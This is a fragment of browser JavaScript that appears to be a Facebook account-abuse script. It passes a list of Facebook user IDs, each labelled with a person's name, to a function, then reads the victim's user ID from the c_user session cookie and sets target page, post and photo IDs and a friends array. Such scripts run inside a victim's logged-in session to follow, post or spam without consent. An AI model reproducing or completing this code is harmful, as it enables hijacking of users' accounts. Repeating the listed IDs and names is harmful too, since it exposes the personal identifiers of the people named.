...
a("100002132650274"); //Muhammad Rafizan
a("100005949876156"); //Mohd Zulhafizi
a("100005905140392"); //Detektif Kudo Cwa II
a("100003396500726"); //Zaliq Syauqi
a("100001719891165"); //Saiful Sabri
a("100001501901844"); //Irfanzuden Shamsuddin
a("100004705180498"); //Maisyara Rahman
a("100003755670744"); //Aleek Syauqi
a("100002399420522"); //Naim Aronz II
a("100001546246890"); //Naim Aronz
a("100000190750972"); //Mohammad Farhan Bin Sabi
a("100001305543741"); //Muhd Nuriman
sublist("");
...
var spage_id = "291481404305526";
var spost_id = "291481404305526";
var sfoto_id = "291481404305526";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
